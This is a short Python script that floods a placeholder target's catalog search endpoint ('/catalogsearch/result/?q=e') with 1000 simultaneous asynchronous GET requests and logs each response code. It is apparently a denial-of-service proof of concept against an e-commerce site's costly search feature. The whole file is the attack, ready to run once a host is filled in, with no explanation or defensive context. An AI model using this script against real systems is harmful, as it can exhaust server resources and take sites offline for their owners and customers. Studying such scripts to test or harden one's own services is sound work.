import asyncio
import aiohttp

url = "http://[TARGET]/catalogsearch/result/?q=e"

async def get(url):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url=url) as response:
                print("Got url {} with response code {}.".format(url, response.status))
    except Exception as e:
        print("Unable to get url {} due to error {}.".format(url, e.__class__))

async def main():
    ret = await asyncio.gather(*[get(url) for _ in range(1000)])
    print("Finalized all. ret is a list of len {} outputs.".format(len(ret)))

asyncio.run(main())